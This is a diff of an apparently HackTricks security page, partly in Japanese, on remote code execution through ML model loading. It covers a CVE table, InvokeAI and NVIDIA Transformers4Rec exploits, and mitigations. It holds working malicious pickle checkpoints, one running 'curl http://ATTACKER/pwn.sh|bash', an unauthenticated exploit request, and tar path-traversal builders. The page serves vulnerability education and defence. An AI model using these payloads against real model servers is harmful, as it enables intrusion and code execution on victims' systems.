@@ -1,45 +1,46 @@
-# Models RCE
+# モデル RCE
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Loading models to RCE
+## モデルをRCEにロードする
 
-Machine Learning modelsは通常、ONNX、TensorFlow、PyTorchなどの異なるフォーマットで共有されます。これらのモデルは、開発者のマシンや本番システムにロードされて使用されます。通常、モデルには悪意のあるコードが含まれていないはずですが、モデルのロードライブラリの脆弱性や意図された機能として、モデルがシステム上で任意のコードを実行するために使用される場合があります。
+Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.
 
-執筆時点でのこの種の脆弱性のいくつかの例は以下の通りです：
+執筆時点で、以下はこの種の脆弱性の例です:
 
 | **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
 |-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
-| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | 悪意のあるpickleがモデルチェックポイントに含まれ、コード実行を引き起こす（`weights_only`の保護をバイパス）                                        | |
-| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 悪意のあるモデルダウンロードがコード実行を引き起こす; 管理APIにおけるJavaデシリアライズRCE                                        | |
-| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAMLからモデルをロードすると`yaml.unsafe_load`を使用（コード実行） <br> **Lambda**レイヤーを使用したモデルのロードが任意のPythonコードを実行する          | |
-| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | 作成された`.tflite`モデルが整数オーバーフローを引き起こし→ヒープ破損（潜在的RCE）                                                      | |
-| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`を介してモデルをロードすると、攻撃者の`__reduce__`ペイロードを持つpickleが実行される                                                   | |
-| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load`のデフォルトがピクルオブジェクト配列を許可したため、悪意のある`.npy/.npz`がコード実行を引き起こす                                            | |
-| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNXモデルの外部ウェイトパスがディレクトリを脱出できる（任意のファイルを読み取る） <br> 悪意のあるONNXモデルtarが任意のファイルを上書きできる（RCEにつながる） | |
-| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | カスタムオペレーターを持つモデルは攻撃者のネイティブコードをロードする必要がある; 複雑なモデルグラフが論理を悪用して意図しない計算を実行する   | |
-| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control`が有効なモデルロードAPIを使用すると、相対パスのトラバーサルが可能になり、ファイルを書き込むことができる（例：RCEのために`.bashrc`を上書き）    | |
-| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | 形式が不正なGGUFモデルファイルがパーサーでヒープバッファオーバーフローを引き起こし、被害者システムでの任意のコード実行を可能にする                     | |
-| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | 悪意のあるHDF5（`.h5`）モデルがLambdaレイヤーコードを持ち、ロード時に実行される（Kerasのsafe_modeは古いフォーマットをカバーしていない – “ダウングレード攻撃”） | |
-| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | 多くのMLツール（例：pickleベースのモデルフォーマット、Python `pickle.load`）は、緩和策がない限り、モデルファイルに埋め込まれた任意のコードを実行します | |
+| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
+| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
+| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
+| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
+| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
+| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
+| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
+| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
+| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
+| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
+| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
+| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
+| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
 
-さらに、[PyTorch](https://github.com/pytorch/pytorch/security)で使用されるようなPythonピクルベースのモデルは、`weights_only=True`でロードされない場合、システム上で任意のコードを実行するために使用される可能性があります。したがって、テーブルにリストされていない場合でも、すべてのピクルベースのモデルはこの種の攻撃に特に脆弱である可能性があります。
+Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.
 
-### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)
+### 🆕  InvokeAI の `torch.load` 経由の RCE (CVE-2024-12029)
 
-`InvokeAI`はStable-Diffusionのための人気のあるオープンソースのWebインターフェースです。バージョン**5.3.1 – 5.4.2**は、ユーザーが任意のURLからモデルをダウンロードしてロードできるRESTエンドポイント`/api/v2/models/install`を公開しています。
+`InvokeAI` is a popular open-source web interface for Stable-Diffusion. Versions **5.3.1 – 5.4.2** expose the REST endpoint `/api/v2/models/install` that lets users download and load models from arbitrary URLs.
 
-内部的に、このエンドポイントは最終的に次のように呼び出します：
+内部では、このエンドポイントは最終的に次を呼び出します:
 ```python
 checkpoint = torch.load(path, map_location=torch.device("meta"))
 ```
-提供されたファイルが**PyTorchチェックポイント（`*.ckpt`）**である場合、`torch.load`は**ピクルデシリアライズ**を実行します。コンテンツがユーザー制御のURLから直接来るため、攻撃者はチェックポイント内にカスタム`__reduce__`メソッドを持つ悪意のあるオブジェクトを埋め込むことができます。このメソッドは**デシリアライズ中**に実行され、**リモートコード実行（RCE）**を引き起こします。
+渡されたファイルが **PyTorch checkpoint (`*.ckpt`)** の場合、`torch.load` は **pickle deserialization** を実行します。コンテンツがユーザー制御の URL から直接取得されるため、攻撃者はカスタム `__reduce__` メソッドを持つ悪意あるオブジェクトを checkpoint 内に埋め込むことができます。これらのメソッドは **during deserialization** 中に実行され、InvokeAI サーバー上で **remote code execution (RCE)** を引き起こします。
 
-この脆弱性には**CVE-2024-12029**（CVSS 9.8、EPSS 61.17%）が割り当てられました。
+この脆弱性には **CVE-2024-12029**（CVSS 9.8、EPSS 61.17 %）が割り当てられました。
 
-#### 攻撃の手順
+#### エクスプロイトの手順
 
-1. 悪意のあるチェックポイントを作成します：
+1. 悪意のある checkpoint を作成する:
 ```python
 # payload_gen.py
 import pickle, torch, os
@@ -51,8 +52,8 @@ return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))
 with open("payload.ckpt", "wb") as f:
 pickle.dump(Payload(), f)
 ```
-2. あなたが制御するHTTPサーバーに`payload.ckpt`をホストします（例: `http://ATTACKER/payload.ckpt`）。
-3. 脆弱なエンドポイントをトリガーします（認証は不要です）：
+2. 自分が管理する HTTP サーバーに `payload.ckpt` をホストする（例: `http://ATTACKER/payload.ckpt`）。
+3. 脆弱なエンドポイントをトリガーする（認証不要）:
 ```python
 import requests
 
@@ -67,36 +68,79 @@ json={},                                         # body can be empty
 timeout=5,
 )
 ```
-4. InvokeAIがファイルをダウンロードすると、`torch.load()`が呼び出され、`os.system`ガジェットが実行され、攻撃者はInvokeAIプロセスのコンテキストでコード実行を得ます。
+4. InvokeAI がファイルをダウンロードすると `torch.load()` を呼び出し → `os.system` gadget が実行され、攻撃者は InvokeAI プロセスのコンテキストでコード実行を得る。
 
-既製のエクスプロイト: **Metasploit** モジュール `exploit/linux/http/invokeai_rce_cve_2024_12029` は全体のフローを自動化します。
+既製の exploit: **Metasploit** モジュール `exploit/linux/http/invokeai_rce_cve_2024_12029` がフロー全体を自動化する。
 
-#### 条件
+#### Conditions
 
-•  InvokeAI 5.3.1-5.4.2（スキャンフラグデフォルト **false**）
-•  `/api/v2/models/install` が攻撃者によって到達可能
-•  プロセスがシェルコマンドを実行する権限を持っている
+•  InvokeAI 5.3.1-5.4.2（scan flag のデフォルトは **false**）  
+•  攻撃者から `/api/v2/models/install` に到達可能であること  
+•  プロセスが shell commands を実行する権限を持っていること
 
-#### 緩和策
+#### Mitigations
 
-* **InvokeAI ≥ 5.4.3** にアップグレード – パッチはデフォルトで `scan=True` を設定し、デシリアライズ前にマルウェアスキャンを実行します。
-* チェックポイントをプログラム的に読み込む際は、`torch.load(file, weights_only=True)` または新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) ヘルパーを使用します。
-* モデルソースのために許可リスト/署名を強制し、最小特権でサービスを実行します。
+* **InvokeAI ≥ 5.4.3** にアップグレードする — このパッチはデフォルトで `scan=True` を設定し、デシリアライズ前にマルウェアスキャンを実行する。  
+* プログラムでチェックポイントを読み込む際は `torch.load(file, weights_only=True)` を使うか、新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) ヘルパーを使う。  
+* モデルのソースに対して allow-lists / signatures を適用し、サービスを最小権限で実行する。
 
-> ⚠️ **任意の** Pythonピクルベースのフォーマット（多くの `.pt`, `.pkl`, `.ckpt`, `.pth` ファイルを含む）は、信頼できないソースからデシリアライズすることが本質的に安全ではないことを忘れないでください。
+> ⚠️ 覚えておいてください：**任意の** Python の pickle-based 形式（多くの `.pt`, `.pkl`, `.ckpt`, `.pth` ファイルを含む）は、信頼できないソースからデシリアライズすることが本質的に危険です。
 
 ---
 
-リバースプロキシの背後で古いInvokeAIバージョンを実行し続ける必要がある場合のアドホックな緩和策の例:
+Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
 ```nginx
 location /api/v2/models/install {
 deny all;                       # block direct Internet access
 allow 10.0.0.0/8;               # only internal CI network can call it
 }
 ```
-## 例 – 悪意のあるPyTorchモデルの作成
+### 🆕 NVIDIA Transformers4Rec の unsafe `torch.load` を介した RCE (CVE-2025-23298)
 
-- モデルを作成する:
+NVIDIAのTransformers4Rec（Merlinの一部）は、ユーザ提供のパスに対して直接`torch.load()`を呼び出す安全でない checkpoint loader を公開していました。`torch.load`はPythonの`pickle`に依存するため、攻撃者が制御する checkpoint はデシリアライズ中の reducer を介して任意のコードを実行できます。
+
+脆弱なパス（修正前）: `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.
+
+なぜこれがRCEにつながるか: Pythonのpickleでは、オブジェクトが reducer（`__reduce__`/`__setstate__`）を定義して呼び出し可能と引数を返すことができます。呼び出し可能はデシリアライズ（unpickling）時に実行されます。そのようなオブジェクトが checkpoint に含まれていると、weights が使用される前に実行されます。
+
+最小の悪意のある checkpoint の例:
+```python
+import torch
+
+class Evil:
+def __reduce__(self):
+import os
+return (os.system, ("id > /tmp/pwned",))
+
+# Place the object under a key guaranteed to be deserialized early
+ckpt = {
+"model_state_dict": Evil(),
+"trainer_state": {"epoch": 10},
+}
+
+torch.save(ckpt, "malicious.ckpt")
+```
+Delivery vectors and blast radius:
+- リポジトリ、バケット、または artifact registries 経由で共有されるトロイ化された checkpoints/models
+- チェックポイントを自動でロードする自動 resume/deploy パイプライン
+- 実行は training/inference workers 内で発生し、しばしば特権昇格された状態で動作する（例: root in containers）
+
+Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) では直接の `torch.load()` を、`transformers4rec/utils/serialization.py` に実装された許可リスト方式のデシリアライザに置き換えました。新しいローダは型/フィールドを検証し、ロード中に任意の callables が呼び出されるのを防ぎます。
+
+Defensive guidance specific to PyTorch checkpoints:
+- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
+- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
+- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
+- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.
+
+POC and vulnerable/patch references:
+- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
+- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
+- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js
+
+## Example – crafting a malicious PyTorch model
+
+- Create the model:
 ```python
 # attacker_payload.py
 import torch
@@ -113,7 +157,7 @@ malicious_state = {"fc.weight": MaliciousPayload()}
 # Save the malicious state dict
 torch.save(malicious_state, "malicious_state.pth")
 ```
-- モデルをロードする:
+- モデルを読み込む:
 ```python
 # victim_load.py
 import torch
@@ -131,11 +175,11 @@ model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))
 
 # /tmp/pwned.txt is created even if you get an error
 ```
-## モデルとパストラバーサル
+## モデルを使った Path Traversal
 
-[**このブログ投稿**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)でコメントされているように、異なるAIフレームワークで使用されるほとんどのモデルフォーマットはアーカイブに基づいており、通常は`.zip`です。したがって、これらのフォーマットを悪用してパストラバーサル攻撃を実行し、モデルがロードされているシステムから任意のファイルを読み取ることが可能かもしれません。
+As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), 多くの AI フレームワークで使用されるモデル形式はアーカイブ（通常は `.zip`）に基づいています。そのため、これらの形式を悪用して path traversal attacks を行い、モデルがロードされるシステム上の任意のファイルを読み取ることが可能になる場合があります。
 
-例えば、以下のコードを使用すると、ロードされたときに`/tmp`ディレクトリにファイルを作成するモデルを作成できます:
+例えば、次のコードを使うと、ロードされたときに `/tmp` ディレクトリにファイルを作成するモデルを作成できます:
 ```python
 import tarfile
 
@@ -146,7 +190,7 @@ return member
 with tarfile.open("traversal_demo.model", "w:gz") as tf:
 tf.add("harmless.txt", filter=escape)
 ```
-次のコードを使用すると、ロードされたときに`/tmp`ディレクトリへのシンボリックリンクを作成するモデルを作成できます:
+あるいは、次のコードを使うと、読み込まれたときに `/tmp` ディレクトリへの symlink を作成するモデルを作成できます:
 ```python
 import tarfile, pathlib
 
@@ -161,20 +205,27 @@ with tarfile.open("symlink_demo.model", "w:gz") as tf:
 tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
 tf.add(PAYLOAD)                      # rides the symlink
 ```
-### 深堀り: Keras .keras デシリアライズとガジェットハンティング
+### 詳細解析: Keras .keras deserialization and gadget hunting
 
-. keras の内部、Lambda-layer RCE、≤ 3.8 の任意インポート問題、およびホワイトリスト内のポストフィックスガジェット発見に関する集中ガイドについては、次を参照してください:
+.keras internals、Lambda-layer RCE、≤ 3.8 における arbitrary import issue、そして allowlist 内での post-fix gadget discovery に関する詳細なガイドは、次を参照してください:
 
 
 {{#ref}}
 ../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
 {{#endref}}
 
-## 参考文献
+## 参考資料
 
-- [OffSec blog – "CVE-2024-12029 – InvokeAIの信頼できないデータのデシリアライズ"](https://www.offsec.com/blog/cve-2024-12029/)
-- [InvokeAI パッチコミット 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
-- [Rapid7 Metasploit モジュールドキュメント](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
-- [PyTorch – torch.load のセキュリティ考慮事項](https://pytorch.org/docs/stable/notes/serialization.html#security)
+- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
+- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
+- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
+- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
+- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
+- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
+- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
+- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
+- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
+- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
+- [Hugging Face Transformers](https://github.com/huggingface/transformers)
 
 {{#include ../banners/hacktricks-training.md}}
